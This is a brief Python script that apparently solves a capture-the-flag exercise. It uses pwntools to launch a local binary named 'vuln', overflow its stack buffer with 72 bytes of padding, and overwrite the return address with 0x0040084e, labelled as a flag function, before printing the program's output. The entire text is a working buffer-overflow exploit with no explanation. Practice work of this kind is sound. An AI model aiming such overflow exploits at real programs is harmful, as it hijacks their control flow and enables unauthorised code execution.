from pwn import *

p = process('./vuln')

padding = b'a'*72
flag_fun = p64(0x0040084e)

payload = padding + flag_fun

p.sendline(payload)
print(p.recvall())
